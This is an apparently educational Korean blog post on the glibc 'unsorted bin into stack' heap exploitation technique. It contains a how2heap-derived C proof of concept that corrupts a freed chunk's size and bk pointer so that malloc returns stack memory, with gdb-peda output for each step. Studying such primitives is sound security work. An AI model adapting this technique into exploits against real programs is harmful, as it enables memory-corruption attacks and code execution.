---
title: Unsorted Bin Attack intot Stack
author: Beomsu Lee
category: [Exploitation, Heap]
tags: [exploitation, heap, unsorted bin]
math: true
mermaid: true
---


## Conditions

- tcache 옵션이 해제되어 있어야 함
- tcache는 malloc과 free 호출 횟수를 줄여 속도를 높이기 위해 고안된 캐싱작업
- 공격자에 의해 heap 영역 할당 및 해제
- 공격자가 stack 영역에 fake chunk 구조 저장할 수 있어야 함

## Exploit plan

1. 2개의 Heap 영역 할당
2. 1번째 Heap 영역 free
    - unsorted bin에 저장
3. stack에 fake chunk를 생성
4. victim의 size를 0x20으로 victim->bk를 fake_chunk로 변조
5. fake_chunk(stack) 영역 할당

## Proof of concept

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main() {
  intptr_t stack_buffer[4] = {0};

  fprintf(stderr, "This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n");

  fprintf(stderr, "Allocating the victim chunk\n");
  intptr_t* victim = malloc(0x100);

  fprintf(stderr, "Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n");
  intptr_t* p1 = malloc(0x100);

  fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
  free(victim);

  fprintf(stderr, "Create a fake chunk on the stack");
  fprintf(stderr, "Set size for next allocation and the bk pointer to any writable address");
  stack_buffer[1] = 0x100 + 0x10;
  stack_buffer[3] = (intptr_t)stack_buffer;

  //------------VULNERABILITY-----------
  fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->size and victim->bk pointer\n");
  fprintf(stderr, "Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && < av->system_mem\n");
  victim[-1] = 32;
  victim[1] = (intptr_t)stack_buffer; // victim->bk is pointing to stack
  //------------------------------------

  fprintf(stderr, "Now next malloc will return the region of our fake chunk: %p\n", &stack_buffer[2]);
  fprintf(stderr, "malloc(0x100): %p\n", malloc(0x100));
}
```

2개의 heap 영역을 할당한다.

```
This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.
Allocating the victim chunk
Allocating another chunk to avoid consolidating the top chunk with the small one during the free()
```

1번째 heap 영역을 해제한다.

```
Freeing the chunk 0x602010, it will be inserted in the unsorted bin
```

unsortedbin에 free chunk가 저장된다.

```
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                top: 0x602220 (size : 0x20de0) 
    last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x602000 (size : 0x110)
```

stack 영역에 fake chunk를 생성한다.

```
Create a fake chunk on the stack
Set size for next allocation and the bk pointer to any writable address
```

fake chunk(stack)

```
gdb-peda$ x/24gx $rbp-0x30
0x7fffffffe4a0: 0x0000000000000000  0x0000000000000110
0x7fffffffe4b0: 0x0000000000000000  0x00007fffffffe4a0
```

victim의 size에 0x20, victim의 bk에 stack_buffer 저장한다.

```
Now emulating a vulnerability that can overwrite the victim->size and victim->bk pointer
Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && < av->system_mem
```

```
gdb-peda$ parseheap
addr                prev                size                 status              fd                bk                
0x602000            0x0                 0x20                 Freed     0x7ffff7dd1b78    0x7fffffffe4a0 <- fake chunk
```

```
Now next malloc will return the region of our fake chunk: 0x7fffffffe4b0
malloc(0x100): 0x7fffffffe4b0
```

fake chunk 영역이 할당된다.

```
gdb-peda$ x/24gx 0x7fffffffe4b0-0x10
0x7fffffffe4a0: 0x0000000000000000  0x0000000000000110
0x7fffffffe4b0: 0x00007ffff7dd1b78  0x00007fffffffe4a0
```

## References
- [unsorted_bin_into_stack.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.27/unsorted_bin_into_stack.c)